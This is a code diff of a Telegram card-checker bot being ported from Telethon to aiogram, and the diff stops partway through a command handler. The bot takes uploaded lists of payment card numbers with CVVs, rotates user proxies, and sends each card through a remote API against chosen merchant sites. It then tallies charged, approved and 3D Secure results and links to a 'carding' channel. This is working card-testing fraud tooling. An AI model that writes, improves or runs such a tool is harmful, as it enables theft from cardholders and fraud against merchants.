@@ -1,48 +1,150 @@
 """
-AFUONA CHECKER BOT 
+AFUONA CHECKER BOT
 Developer: 𓆩𝗔𓆪𝗙𝗨𝗢𝗡𝗔
 Telegram: https://t.me/afuonax
+Rewritten with aiogram 3.x
 """
 
-from telethon import TelegramClient, events, Button
-import requests
-import random
-import datetime
+import asyncio
 import json
 import os
+import random
 import re
-import asyncio
-import aiohttp
+
 import aiofiles
+import aiohttp
+from aiogram import Bot, Dispatcher, F
+from aiogram.filters import Command
+from aiogram.types import (
+    CallbackQuery,
+    InlineKeyboardButton,
+    InlineKeyboardMarkup,
+    Message,
+    FSInputFile,
+)
 
 # ==================== CONFIG ====================
-API_ID = int(os.getenv("API_ID", "1234567"))
-API_HASH = os.getenv("API_HASH", "your_api_hash")
 BOT_TOKEN = os.getenv("BOT_TOKEN", "your_bot_token")
 API_BASE_URL = "https://xafuona.3utilities.com"
 API_KEY = "afuona_2026"
 SECOND_CHANNEL_LINK = "https://t.me/+kxhCcDXQgzQ5MjE0"
 
-# Files
-USER_SITES_FILE = "user_sites.json"
+USER_SITES_FILE  = "user_sites.json"
 USER_PROXIES_FILE = "user_proxies.json"
 
-# Limits
-MAX_SITES = 10
-MAX_PROXIES = 10
-
-# File upload limits
-MAX_SITES_FILE = 100
+MAX_SITES        = 10
+MAX_PROXIES      = 10
+MAX_SITES_FILE   = 100
 MAX_PROXIES_FILE = 100
-MAX_CARDS_FILE = 1000
+MAX_CARDS_FILE   = 1000
+MAX_CARDS        = 1000
 
-# Active processes
-active_processes = {}
+active_processes: dict = {}
 
-# ==================== CLIENT SETUP ====================
-client = TelegramClient('afuona_bot', API_ID, API_HASH)
+bot = Bot(token=BOT_TOKEN)
+dp  = Dispatcher()
 
-# ==================== HELPER FUNCTIONS ====================
+# ==================== INLINE KEYBOARDS ====================
+
+def kb_main():
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [
+            InlineKeyboardButton(text="💳 CHECK CARDS",  callback_data="check_cards"),
+            InlineKeyboardButton(text="🌐 ADD SITES",    callback_data="add_sites"),
+        ],
+        [
+            InlineKeyboardButton(text="🔌 ADD PROXY",    callback_data="add_proxies"),
+            InlineKeyboardButton(text="📋 MY SITES",     callback_data="my_sites"),
+        ],
+        [
+            InlineKeyboardButton(text="📋 MY PROXIES",   callback_data="my_proxies"),
+            InlineKeyboardButton(text="🧪 TEST SITES",   callback_data="test_sites"),
+        ],
+        [
+            InlineKeyboardButton(text="🧪 TEST PROXIES", callback_data="test_proxies"),
+            InlineKeyboardButton(text="ℹ️ USER INFO",    callback_data="user_info"),
+        ],
+    ])
+
+def kb_start():
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [
+            InlineKeyboardButton(text="𝙼𝙰𝙸𝙽", url="https://t.me/afuonax"),
+            InlineKeyboardButton(text="𝙲𝙰𝚁𝙳𝙸𝙽𝙶", url=SECOND_CHANNEL_LINK),
+        ],
+        [
+            InlineKeyboardButton(text="💳 CHECK CARDS",  callback_data="check_cards"),
+            InlineKeyboardButton(text="🌐 ADD SITES",    callback_data="add_sites"),
+        ],
+        [
+            InlineKeyboardButton(text="🔌 ADD PROXY",    callback_data="add_proxies"),
+            InlineKeyboardButton(text="📋 MY SITES",     callback_data="my_sites"),
+        ],
+        [
+            InlineKeyboardButton(text="📋 MY PROXIES",   callback_data="my_proxies"),
+            InlineKeyboardButton(text="🧪 TEST SITES",   callback_data="test_sites"),
+        ],
+        [
+            InlineKeyboardButton(text="🧪 TEST PROXIES", callback_data="test_proxies"),
+            InlineKeyboardButton(text="ℹ️ USER INFO",    callback_data="user_info"),
+        ],
+    ])
+
+def kb_back_main():
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🔙 BACK TO MAIN", callback_data="back_to_main")]
+    ])
+
+def kb_back_start():
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🔙 BACK", callback_data="back_to_start")]
+    ])
+
+def kb_stop(user_id: int):
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="⛔ STOP", callback_data=f"stop:{user_id}")]
+    ])
+
+def kb_sites_list(user_sites: list):
+    rows = []
+    for i in range(min(5, len(user_sites))):
+        rows.append([InlineKeyboardButton(
+            text=f"🗑️ Remove #{i+1}",
+            callback_data=f"removesite_{i}"
+        )])
+    if len(user_sites) > 5:
+        rows.append([InlineKeyboardButton(text="🗑️ Remove All", callback_data="remove_all_sites")])
+    rows.append([InlineKeyboardButton(text="🔙 BACK TO MAIN", callback_data="back_to_main")])
+    return InlineKeyboardMarkup(inline_keyboard=rows)
+
+def kb_proxies_list(user_proxies: list):
+    rows = []
+    for i in range(min(5, len(user_proxies))):
+        rows.append([InlineKeyboardButton(
+            text=f"🗑️ Remove #{i+1}",
+            callback_data=f"removeproxy_{i}"
+        )])
+    if len(user_proxies) > 5:
+        rows.append([InlineKeyboardButton(text="🗑️ Remove All", callback_data="remove_all_proxies")])
+    rows.append([InlineKeyboardButton(text="🔙 BACK TO MAIN", callback_data="back_to_main")])
+    return InlineKeyboardMarkup(inline_keyboard=rows)
+
+def kb_progress(card: str, response: str, charged: int, approved: int,
+                 threed: int, declined: int, checked: int, total: int, user_id: int):
+    noop = f"noop:{user_id}"
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text=f"💳 Card ➜ {card[:12]}****",            callback_data=noop)],
+        [InlineKeyboardButton(text=f"📨 Response ➜ {response[:28]}",        callback_data=noop)],
+        [InlineKeyboardButton(text=f"💎 CHARGE  ➜ [ {charged} ]",           callback_data=noop)],
+        [InlineKeyboardButton(text=f"✅ Approve ➜ [ {approved} ]",          callback_data=noop)],
+        [InlineKeyboardButton(text=f"🟡 3D Secure ➜ [ {threed} ]",          callback_data=noop)],
+        [InlineKeyboardButton(text=f"❌ Decline ➜ [ {declined} ]",          callback_data=noop)],
+        [InlineKeyboardButton(text=f"📊 Progress ➜ [{checked}/{total}]",    callback_data=noop)],
+        [InlineKeyboardButton(text="⛔ STOP",                                callback_data=f"stop:{user_id}")],
+    ])
+
+# ==================== HELPERS ====================
+
 async def load_json(filename):
     try:
         if os.path.exists(filename):
@@ -60,17 +162,13 @@ async def save_json(filename, data):
             await f.write(json.dumps(data, indent=4))
     except Exception as e:
         print(f"Error saving {filename}: {e}")
-        return {}
 
 def validate_card(text):
     if not text:
         return None
-    
     text = text.replace('\n', ' ').replace('/', ' ').replace('|', ' ')
     numbers = re.findall(r'\d+', text)
-    
     cc = mm = yy = cvv = ''
-    
     for num in numbers:
         if len(num) == 16 and num.isdigit():
             cc = num
@@ -82,7 +180,6 @@ def validate_card(text):
             yy = num[2:]
         elif len(num) in [3, 4] and not cvv:
             cvv = num
-    
     if cc and mm and yy and cvv:
         return f"{cc}|{mm}|{yy}|{cvv}"
     return None
@@ -103,32 +200,27 @@ def extract_cards(content):
 
 def parse_proxy(proxy_str):
     proxy_str = proxy_str.strip()
-    
     proxy_type = 'http'
     if proxy_str.startswith(('socks5://', 'socks4://', 'https://')):
-        type_match = re.match(r'^(socks5|socks4|https)://', proxy_str)
-        if type_match:
-            proxy_type = type_match.group(1)
-            proxy_str = proxy_str.split('://', 1)[1]
-    
-    # user:pass@ip:port
-    match = re.match(r'^([^:@]+):([^@]+)@([^:@]+):(\d+)$', proxy_str)
-    if match:
-        username, password, ip, port = match.groups()
-        return f"{proxy_type}://{username}:{password}@{ip}:{port}"
-    
-    # ip:port:user:pass
-    match = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy_str)
-    if match:
-        ip, port, username, password = match.groups()
-        return f"{proxy_type}://{username}:{password}@{ip}:{port}"
-    
-    # ip:port
-    match = re.match(r'^([^:@]+):(\d+)$', proxy_str)
-    if match:
-        ip, port = match.groups()
+        m = re.match(r'^(socks5|socks4|https)://', proxy_str)
+        if m:
+            proxy_type = m.group(1)
+            proxy_str  = proxy_str.split('://', 1)[1]
+
+    m = re.match(r'^([^:@]+):([^@]+)@([^:@]+):(\d+)$', proxy_str)
+    if m:
+        u, p, ip, port = m.groups()
+        return f"{proxy_type}://{u}:{p}@{ip}:{port}"
+
+    m = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy_str)
+    if m:
+        ip, port, u, p = m.groups()
+        return f"{proxy_type}://{u}:{p}@{ip}:{port}"
+
+    m = re.match(r'^([^:@]+):(\d+)$', proxy_str)
+    if m:
+        ip, port = m.groups()
         return f"{proxy_type}://{ip}:{port}"
-    
     return None
 
 async def test_proxy(proxy_url):
@@ -137,8 +229,7 @@ async def test_proxy(proxy_url):
         async with aiohttp.ClientSession(timeout=timeout) as session:
             async with session.get('http://api.ipify.org', proxy=proxy_url) as resp:
                 if resp.status == 200:
-                    ip = await resp.text()
-                    return True, ip.strip()
+                    return True, (await resp.text()).strip()
                 return False, f"HTTP {resp.status}"
     except Exception as e:
         return False, str(e)
@@ -146,86 +237,60 @@ async def test_proxy(proxy_url):
 async def get_bin_info(card_number):
     try:
         bin_num = card_number[:6]
-        async with aiohttp.ClientSession() as session:
-            async with session.get(f"https://lookup.binlist.net/{bin_num}", 
-                                   headers={'Accept-Version': '3'}) as resp:
+        async with aiohttp.ClientSession() as s:
+            async with s.get(f"https://lookup.binlist.net/{bin_num}",
+                             headers={'Accept-Version': '3'}) as resp:
                 if resp.status == 200:
-                    data = await resp.json()
+                    d = await resp.json()
                     return {
-                        'brand': data.get('scheme', 'N/A'),
-                        'type': data.get('type', 'N/A'),
-                        'level': data.get('brand', 'N/A'),
-                        'bank': data.get('bank', {}).get('name', 'N/A'),
-                        'country': data.get('country', {}).get('name', 'N/A'),
-                        'flag': data.get('country', {}).get('emoji', '🏳️')
+                        'brand':   d.get('scheme', 'N/A'),
+                        'type':    d.get('type', 'N/A'),
+                        'level':   d.get('brand', 'N/A'),
+                        'bank':    d.get('bank', {}).get('name', 'N/A'),
+                        'country': d.get('country', {}).get('name', 'N/A'),
+                        'flag':    d.get('country', {}).get('emoji', '🏳️'),
                     }
     except:
         pass
-    return {
-        'brand': 'N/A',
-        'type': 'N/A',
-        'level': 'N/A',
-        'bank': 'N/A',
-        'country': 'N/A',
-        'flag': '🏳️'
-    }
+    return {'brand': 'N/A', 'type': 'N/A', 'level': 'N/A',
+            'bank': 'N/A', 'country': 'N/A', 'flag': '🏳️'}
 
 def get_card_status(response_text, status_text):
-    response_lower = response_text.lower()
-    
-    if "charged" in response_lower or "thank you" in response_lower or "order completed" in response_lower or "💎" in response_text:
+    rl = response_text.lower()
+    if any(x in rl for x in ["charged", "thank you", "order completed"]) or "💎" in response_text:
         return "CHARGED 💎"
-    
-    if status_text == "Approved" or "insufficient" in response_lower:
+    if status_text == "Approved" or "insufficient" in rl:
         return "APPROVED ✅"
-    
-    if "3d" in response_lower or "secure" in response_lower:
+    if "3d" in rl or "secure" in rl:
         return "3D SECURE 🟡"
-    
     return None
 
 def format_bold(text):
-    """Convert text to bold unicode characters"""
     bold_map = {
-        'A': '𝗔', 'B': '𝗕', 'C': '𝗖', 'D': '𝗗', 'E': '𝗘', 'F': '𝗙', 'G': '𝗚', 'H': '𝗛', 'I': '𝗜',
-        'J': '𝗝', 'K': '𝗞', 'L': '𝗟', 'M': '𝗠', 'N': '𝗡', 'O': '𝗢', 'P': '𝗣', 'Q': '𝗤', 'R': '𝗥',
-        'S': '𝗦', 'T': '𝗧', 'U': '𝗨', 'V': '𝗩', 'W': '𝗪', 'X': '𝗫', 'Y': '𝗬', 'Z': '𝗭',
-        'a': '𝗮', 'b': '𝗯', 'c': '𝗰', 'd': '𝗱', 'e': '𝗲', 'f': '𝗳', 'g': '𝗴', 'h': '𝗵', 'i': '𝗶',
-        'j': '𝗷', 'k': '𝗸', 'l': '𝗹', 'm': '𝗺', 'n': '𝗻', 'o': '𝗼', 'p': '𝗽', 'q': '𝗾', 'r': '𝗿',
-        's': '𝘀', 't': '𝘁', 'u': '𝘂', 'v': '𝘃', 'w': '𝘄', 'x': '𝘅', 'y': '𝘆', 'z': '𝘇',
-        '0': '𝟬', '1': '𝟭', '2': '𝟮', '3': '𝟯', '4': '𝟰', '5': '𝟱', '6': '𝟲', '7': '𝟳', '8': '𝟴', '9': '𝟵'
+        'A':'𝗔','B':'𝗕','C':'𝗖','D':'𝗗','E':'𝗘','F':'𝗙','G':'𝗚','H':'𝗛','I':'𝗜',
+        'J':'𝗝','K':'𝗞','L':'𝗟','M':'𝗠','N':'𝗡','O':'𝗢','P':'𝗣','Q':'𝗤','R':'𝗥',
+        'S':'𝗦','T':'𝗧','U':'𝗨','V':'𝗩','W':'𝗪','X':'𝗫','Y':'𝗬','Z':'𝗭',
+        'a':'𝗮','b':'𝗯','c':'𝗰','d':'𝗱','e':'𝗲','f':'𝗳','g':'𝗴','h':'𝗵','i':'𝗶',
+        'j':'𝗷','k':'𝗸','l':'𝗹','m':'𝗺','n':'𝗻','o':'𝗼','p':'𝗽','q':'𝗾','r':'𝗿',
+        's':'𝘀','t':'𝘁','u':'𝘂','v':'𝘃','w':'𝘄','x':'𝘅','y':'𝘆','z':'𝘇',
+        '0':'𝟬','1':'𝟭','2':'𝟮','3':'𝟯','4':'𝟰','5':'𝟱','6':'𝟲','7':'𝟳','8':'𝟴','9':'𝟵',
     }
-    
-    result = ""
-    for char in text:
-        if char in bold_map:
-            result += bold_map[char]
-        else:
-            result += char
-    return result
+    return ''.join(bold_map.get(c, c) for c in text)
 
-# ==================== API FUNCTIONS ====================
+# ==================== API ====================
+
 async def check_card_via_api(card, site, proxy):
     try:
         site = site.replace('https://', '').replace('http://', '').split('/')[0]
-        
-        formatted_card = validate_card(card)
-        if not formatted_card:
+        formatted = validate_card(card)
+        if not formatted:
             return {"Response": "Invalid card format", "Status": "Error"}
-        
-        params = {
-            'key': API_KEY,
-            'site': site,
-            'cc': formatted_card,
-            'proxy': proxy
-        }
-        
+        params = {'key': API_KEY, 'site': site, 'cc': formatted, 'proxy': proxy}
         timeout = aiohttp.ClientTimeout(total=30)
-        async with aiohttp.ClientSession(timeout=timeout) as session:
-            async with session.get(f"{API_BASE_URL}/process", params=params) as resp:
+        async with aiohttp.ClientSession(timeout=timeout) as s:
+            async with s.get(f"{API_BASE_URL}/process", params=params) as resp:
                 if resp.status != 200:
                     return {"Response": f"HTTP {resp.status}", "Status": "Error"}
-                
                 return await resp.json()
     except Exception as e:
         return {"Response": str(e), "Status": "Error"}
@@ -233,1754 +298,1045 @@ async def check_card_via_api(card, site, proxy):
 async def test_site_via_api(site, proxy):
     try:
         site = site.replace('https://', '').replace('http://', '').split('/')[0]
-        
-        params = {
-            'key': API_KEY,
-            'site': site,
-            'proxy': proxy
-        }
-        
+        params = {'key': API_KEY, 'site': site, 'proxy': proxy}
         timeout = aiohttp.ClientTimeout(total=30)
-        async with aiohttp.ClientSession(timeout=timeout) as session:
-            async with session.get(f"{API_BASE_URL}/test_site", params=params) as resp:
+        async with aiohttp.ClientSession(timeout=timeout) as s:
+            async with s.get(f"{API_BASE_URL}/test_site", params=params) as resp:
                 if resp.status != 200:
                     return {"working": False, "response": f"HTTP {resp.status}"}
-                
                 return await resp.json()
     except Exception as e:
         return {"working": False, "response": str(e)}
 
-# ==================== COMMAND HANDLERS ====================
-@client.on(events.NewMessage(pattern='/start'))
-async def start_command(event):
-    await show_start_menu(event)
+# ==================== SEND START MENU ====================
 
-@client.on(events.NewMessage(pattern='/add'))
-async def add_command(event):
-    user_id = str(event.sender_id)
-    
-    text = event.raw_text[4:].strip()
+async def send_start_menu(target, first_name: str):
+    """target = Message or CallbackQuery"""
+    text = f"✨ 𝗪𝗲𝗹𝗰𝗼𝗺𝗲, {first_name}!\n𝚍𝚘𝚗'𝚝 𝚏𝚘𝚛𝚐𝚎𝚝 𝚝𝚘 𝚜𝚞𝚋𝚜𝚌𝚛𝚒𝚋𝚎 𝚝𝚘 𝚝𝚑𝚎 𝚌𝚑𝚊𝚗𝚗𝚎𝚕𝚜 ‌♡⁩"
+    markup = kb_start()
+
+    chat_id = target.from_user.id if isinstance(target, CallbackQuery) else target.chat.id
+
+    for ext in ['jpg', 'jpeg', 'png']:
+        path = f"bot_image.{ext}"
+        if os.path.exists(path):
+            try:
+                if isinstance(target, CallbackQuery):
+                    await target.message.delete()
+                await bot.send_photo(chat_id, FSInputFile(path),
+                                     caption=text, reply_markup=markup)
+                return
+            except:
+                continue
+
+    if isinstance(target, CallbackQuery):
+        try:
+            await target.message.edit_text(text, reply_markup=markup)
+        except:
+            await bot.send_message(chat_id, text, reply_markup=markup)
+    else:
+        await target.answer(text, reply_markup=markup)
+
+async def send_main_menu(target):
+    chat_id = target.from_user.id if isinstance(target, CallbackQuery) else target.chat.id
+    text = (
+        "┏━━━━━━━━━━━━━━━━┓\n"
+        f"┃ 💳 {format_bold('Check Cards')}\n"
+        f"┃ 🌐 {format_bold('Add Sites')}\n"
+        f"┃ 🔌 {format_bold('Add Proxy')}\n"
+        f"┃ 📋 {format_bold('My Sites')}\n"
+        f"┃ 📋 {format_bold('My Proxies')}\n"
+        f"┃ 🧪 {format_bold('Test Sites / Proxies')}\n"
+        f"┃ ℹ️ {format_bold('User Info')}\n"
+        "┗━━━━━━━━━━━━━━━━┛"
+    )
+    markup = kb_main()
+
+    for ext in ['jpg', 'jpeg', 'png']:
+        path = f"bot_image.{ext}"
+        if os.path.exists(path):
+            try:
+                if isinstance(target, CallbackQuery):
+                    await target.message.delete()
+                await bot.send_photo(chat_id, FSInputFile(path),
+                                     caption=text, reply_markup=markup)
+                return
+            except:
+                continue
+
+    if isinstance(target, CallbackQuery):
+        try:
+            await target.message.edit_text(text, reply_markup=markup)
+        except:
+            await bot.send_message(chat_id, text, reply_markup=markup)
+    else:
+        await target.answer(text, reply_markup=markup)
+
+# ==================== COMMAND HANDLERS ====================
+
+@dp.message(Command("start"))
+async def cmd_start(message: Message):
+    first_name = message.from_user.first_name or "there"
+    await send_start_menu(message, first_name)
+
+@dp.message(Command("add"))
+async def cmd_add(message: Message):
+    user_id = str(message.from_user.id)
+    text = message.text[4:].strip()
     if not text:
-        return await event.reply("❌ Usage: /add site1.com site2.com")
-    
+        return await message.reply("❌ Usage: /add site1.com site2.com")
+
     sites_to_add = []
     for word in text.split():
         word = word.replace('https://', '').replace('http://', '').split('/')[0]
         if re.match(r'^[a-zA-Z0-9][a-zA-Z0-9\-]*\.[a-zA-Z]{2,}', word):
             sites_to_add.append(word)
-    
+
     if not sites_to_add:
-        return await event.reply("❌ No valid sites found!")
-    
+        return await message.reply("❌ No valid sites found!")
+
     proxies = await load_json(USER_PROXIES_FILE)
     user_proxies = proxies.get(user_id, [])
-    
     if not user_proxies:
-        return await event.reply("❌ You need at least one working proxy to test sites!")
-    
-    status_msg = await event.reply(f"🔄 Testing {len(sites_to_add)} sites...")
-    
+        return await message.reply("❌ You need at least one working proxy to test sites!")
+
+    status_msg = await message.reply(f"🔄 Testing {len(sites_to_add)} sites...")
     proxy = random.choice(user_proxies)['url']
     working_sites = []
-    
+
     for i, site in enumerate(sites_to_add, 1):
-        await status_msg.edit(f"🔄 Testing [{i}/{len(sites_to_add)}]: {site}")
+        try:
+            await status_msg.edit_text(f"🔄 Testing [{i}/{len(sites_to_add)}]: {site}")
+        except:
+            pass
         result = await test_site_via_api(site, proxy)
         if result.get('working'):
             working_sites.append(site)
         await asyncio.sleep(0.5)
-    
+
     sites_data = await load_json(USER_SITES_FILE)
     current_sites = sites_data.get(user_id, [])
-    
     added = []
     for site in working_sites:
         if site not in current_sites and len(current_sites) < MAX_SITES:
             current_sites.append(site)
             added.append(site)
-    
     if added:
         sites_data[user_id] = current_sites
         await save_json(USER_SITES_FILE, sites_data)
-    
-    await status_msg.edit(f"✅ Added {len(added)} working sites. Total: {len(current_sites)}/{MAX_SITES}")
 
-@client.on(events.NewMessage(pattern='/rm'))
-async def rm_command(event):
-    user_id = str(event.sender_id)
-    
-    text = event.raw_text[3:].strip()
+    await status_msg.edit_text(
+        f"✅ Added {len(added)} working sites. Total: {len(current_sites)}/{MAX_SITES}"
+    )
+
+@dp.message(Command("rm"))
+async def cmd_rm(message: Message):
+    user_id = str(message.from_user.id)
+    text = message.text[3:].strip()
     if not text:
-        return await event.reply("❌ Usage: /rm site.com or /rm all")
-    
+        return await message.reply("❌ Usage: /rm site.com or /rm all")
+
     sites_data = await load_json(USER_SITES_FILE)
     user_sites = sites_data.get(user_id, [])
-    
     if not user_sites:
-        return await event.reply("❌ You have no sites to remove!")
-    
+        return await message.reply("❌ You have no sites to remove!")
+
     if text.lower() == 'all':
         del sites_data[user_id]
         await save_json(USER_SITES_FILE, sites_data)
-        return await event.reply(f"✅ Removed all {len(user_sites)} sites!")
-    
+        return await message.reply(f"✅ Removed all {len(user_sites)} sites!")
+
     site_to_remove = text.replace('https://', '').replace('http://', '').split('/')[0]
-    
     if site_to_remove in user_sites:
         user_sites.remove(site_to_remove)
-        if user_sites:
-            sites_data[user_id] = user_sites
-        else:
+        sites_data[user_id] = user_sites if user_sites else sites_data
+        if not user_sites:
             del sites_data[user_id]
         await save_json(USER_SITES_FILE, sites_data)
-        await event.reply(f"✅ Removed: {site_to_remove}")
+        await message.reply(f"✅ Removed: {site_to_remove}")
     else:
-        await event.reply(f"❌ Site not found!")
+        await message.reply("❌ Site not found!")
 
-@client.on(events.NewMessage(pattern='/mysites'))
-async def mysites_command(event):
-    user_id = str(event.sender_id)
+@dp.message(Command("mysites"))
+async def cmd_mysites(message: Message):
+    user_id = str(message.from_user.id)
     sites_data = await load_json(USER_SITES_FILE)
     user_sites = sites_data.get(user_id, [])
-    
     if not user_sites:
-        return await event.reply("❌ You have no saved sites!")
-    
+        return await message.reply("❌ You have no saved sites!")
     text = f"📊 Your Sites ({len(user_sites)}/{MAX_SITES}):\n\n"
     for i, site in enumerate(user_sites, 1):
         text += f"{i}. {site}\n"
-    
-    await event.reply(text)
+    await message.reply(text)
 
-@client.on(events.NewMessage(pattern='/addproxy'))
-async def addproxy_command(event):
-    user_id = str(event.sender_id)
-    
-    if event.is_group:
-        return await event.reply("🔒 This command only works in private chat!")
-    
-    text = event.raw_text[9:].strip()
+@dp.message(Command("addproxy"))
+async def cmd_addproxy(message: Message):
+    user_id = str(message.from_user.id)
+    if message.chat.type != "private":
+        return await message.reply("🔒 This command only works in private chat!")
+
+    text = message.text[9:].strip()
     if not text:
-        return await event.reply("❌ Usage: /addproxy ip:port or /addproxy ip:port:user:pass")
-    
+        return await message.reply("❌ Usage: /addproxy ip:port or /addproxy ip:port:user:pass")
+
     proxies = await load_json(USER_PROXIES_FILE)
     user_proxies = proxies.get(user_id, [])
-    
     proxy_url = parse_proxy(text)
     if not proxy_url:
-        return await event.reply("❌ Invalid proxy format!")
-    
-    status_msg = await event.reply("🔄 Testing proxy...")
+        return await message.reply("❌ Invalid proxy format!")
+
+    status_msg = await message.reply("🔄 Testing proxy...")
     is_working, ip = await test_proxy(proxy_url)
-    
     if not is_working:
-        return await status_msg.edit("❌ Proxy is not working!")
-    
-    exists = any(p['original'] == text for p in user_proxies)
-    if exists:
-        return await status_msg.edit("⚠️ Proxy already exists!")
-    
+        return await status_msg.edit_text("❌ Proxy is not working!")
+
+    if any(p['original'] == text for p in user_proxies):
+        return await status_msg.edit_text("⚠️ Proxy already exists!")
     if len(user_proxies) >= MAX_PROXIES:
-        return await status_msg.edit(f"❌ Max proxies limit ({MAX_PROXIES}) reached!")
-    
-    user_proxies.append({
-        'original': text,
-        'url': proxy_url,
-        'ip': ip
-    })
-    
+        return await status_msg.edit_text(f"❌ Max proxies limit ({MAX_PROXIES}) reached!")
+
+    user_proxies.append({'original': text, 'url': proxy_url, 'ip': ip})
     proxies[user_id] = user_proxies
     await save_json(USER_PROXIES_FILE, proxies)
-    
-    await status_msg.edit(f"✅ Proxy added! (IP: {ip})")
+    await status_msg.edit_text(f"✅ Proxy added! (IP: {ip})")
 
-@client.on(events.NewMessage(pattern='/rmproxy'))
-async def rmproxy_command(event):
-    user_id = str(event.sender_id)
-    
-    if event.is_group:
-        return await event.reply("🔒 This command only works in private chat!")
-    
-    text = event.raw_text[8:].strip()
-    
+@dp.message(Command("rmproxy"))
+async def cmd_rmproxy(message: Message):
+    user_id = str(message.from_user.id)
+    if message.chat.type != "private":
+        return await message.reply("🔒 This command only works in private chat!")
+
+    text = message.text[8:].strip()
     proxies = await load_json(USER_PROXIES_FILE)
     user_proxies = proxies.get(user_id, [])
-    
     if not user_proxies:
-        return await event.reply("❌ You have no proxies to remove!")
-    
+        return await message.reply("❌ You have no proxies to remove!")
+
     if not text:
-        proxy_list = "Your proxies:\n\n"
+        pl = "Your proxies:\n\n"
         for i, p in enumerate(user_proxies, 1):
-            proxy_list += f"{i}. {p['original']}\n"
-        proxy_list += "\nUse /rmproxy [number] or /rmproxy all"
-        return await event.reply(proxy_list)
-    
+            pl += f"{i}. {p['original']}\n"
+        pl += "\nUse /rmproxy [number] or /rmproxy all"
+        return await message.reply(pl)
+
     if text.lower() == 'all':
         del proxies[user_id]
         await save_json(USER_PROXIES_FILE, proxies)
-        return await event.reply(f"✅ Removed all {len(user_proxies)} proxies!")
-    
+        return await message.reply(f"✅ Removed all {len(user_proxies)} proxies!")
+
     try:
-        index = int(text) - 1
-        if 0 <= index < len(user_proxies):
-            removed = user_proxies.pop(index)
-            if user_proxies:
-                proxies[user_id] = user_proxies
-            else:
+        idx = int(text) - 1
+        if 0 <= idx < len(user_proxies):
+            removed = user_proxies.pop(idx)
+            proxies[user_id] = user_proxies if user_proxies else proxies
+            if not user_proxies:
                 del proxies[user_id]
             await save_json(USER_PROXIES_FILE, proxies)
-            await event.reply(f"✅ Removed: {removed['original']}")
+            await message.reply(f"✅ Removed: {removed['original']}")
         else:
-            await event.reply(f"❌ Invalid index! Choose 1-{len(user_proxies)}")
+            await message.reply(f"❌ Invalid index! Choose 1-{len(user_proxies)}")
     except ValueError:
-        await event.reply("❌ Please provide a valid number or 'all'")
+        await message.reply("❌ Please provide a valid number or 'all'")
 
-@client.on(events.NewMessage(pattern='/myproxies'))
-async def myproxies_command(event):
-    user_id = str(event.sender_id)
-    
-    if event.is_group:
-        return await event.reply("🔒 This command only works in private chat!")
-    
+@dp.message(Command("myproxies"))
+async def cmd_myproxies(message: Message):
+    user_id = str(message.from_user.id)
+    if message.chat.type != "private":
+        return await message.reply("🔒 This command only works in private chat!")
     proxies = await load_json(USER_PROXIES_FILE)
     user_proxies = proxies.get(user_id, [])
-    
     if not user_proxies:
-        return await event.reply("❌ You have no saved proxies!")
-    
+        return await message.reply("❌ You have no saved proxies!")
     text = f"📊 Your Proxies ({len(user_proxies)}/{MAX_PROXIES}):\n\n"
     for i, p in enumerate(user_proxies, 1):
         text += f"{i}. {p['original']} (IP: {p['ip']})\n"
-    
-    await event.reply(text)
+    await message.reply(text)
 
-@client.on(events.NewMessage(pattern='/mtxt'))
-async def mtxt_command(event):
-    user_id = event.sender_id
-    
+@dp.message(Command("mtxt"))
+async def cmd_mtxt(message: Message):
+    user_id = message.from_user.id
     if user_id in active_processes:
-        return await event.reply("```Lunch is on the way 🍑 wait until it cools down```")
-    
-    if not event.is_reply:
-        return await event.reply("```Please reply to a .txt file with /mtxt```")
-    
-    replied = await event.get_reply_message()
+        return await message.reply("`Lunch is on the way 🍑 wait until it cools down`",
+                                   parse_mode="Markdown")
+    if not message.reply_to_message:
+        return await message.reply("`Please reply to a .txt file with /mtxt`",
+                                   parse_mode="Markdown")
+
+    replied = message.reply_to_message
     if not replied.document:
-        return await event.reply("```That's not a file. Please reply to a .txt file.```")
-    
+        return await message.reply("`That's not a file. Please reply to a .txt file.`",
+                                   parse_mode="Markdown")
+
     proxies = await load_json(USER_PROXIES_FILE)
     user_proxies = proxies.get(str(user_id), [])
     if not user_proxies:
-        return await event.reply("❌ You need at least one working proxy!")
-    
+        return await message.reply("❌ You need at least one working proxy!")
+
     sites = await load_json(USER_SITES_FILE)
     user_sites = sites.get(str(user_id), [])
     if not user_sites:
-        return await event.reply("❌ You need at least one working site!")
-    
-    file_path = await replied.download_media()
-    
+        return await message.reply("❌ You need at least one working site!")
+
+    file_info = await bot.get_file(replied.document.file_id)
+    file_path = f"/tmp/{replied.document.file_name or 'cards.txt'}"
+    await bot.download_file(file_info.file_path, file_path)
+
     try:
         async with aiofiles.open(file_path, 'r', encoding='utf-8') as f:
             content = await f.read()
     except:
         async with aiofiles.open(file_path, 'r', encoding='latin-1') as f:
             content = await f.read()
-    
+
     os.remove(file_path)
-    
-    cards = extract_cards(content)
-    
-    if not cards:
-        return await event.reply("```❌ No valid cards found in file!```")
-    
+
     lines = content.splitlines()
     if len(lines) > MAX_CARDS_FILE:
-        return await event.reply(f"```❌ File too large! Max {MAX_CARDS_FILE} lines.```")
-    
-    if len(cards) > MAX_CARDS:
-        cards = cards[:MAX_CARDS]
-        await event.reply(f"```⚠️ Checking only first {MAX_CARDS} cards```")
-    
-    active_processes[user_id] = {'type': 'checking'}
-    await event.reply(f"```🍑 Preparing to check {len(cards)} cards...```")
-    
-    await process_card_check(event, cards, user_sites, user_proxies)
+        return await message.reply(
+            f"━━━━━━━━━━━━━━\n❌ FILE TOO LARGE\n━━━━━━━━━━━━━\n\n"
+            f"Max {MAX_CARDS_FILE} cards per file."
+        )
 
-@client.on(events.NewMessage(pattern='/ran'))
-async def ran_command(event):
-    user_id = event.sender_id
-    
-    if user_id in active_processes:
-        return await event.reply("```Lunch is on the way 🍑 wait until it cools down```")
-    
-    if not event.is_reply:
-        return await event.reply("```Please reply to a .txt file with /ran```")
-    
-    replied = await event.get_reply_message()
-    if not replied.document:
-        return await event.reply("```That's not a file. Please reply to a .txt file.```")
-    
-    proxies = await load_json(USER_PROXIES_FILE)
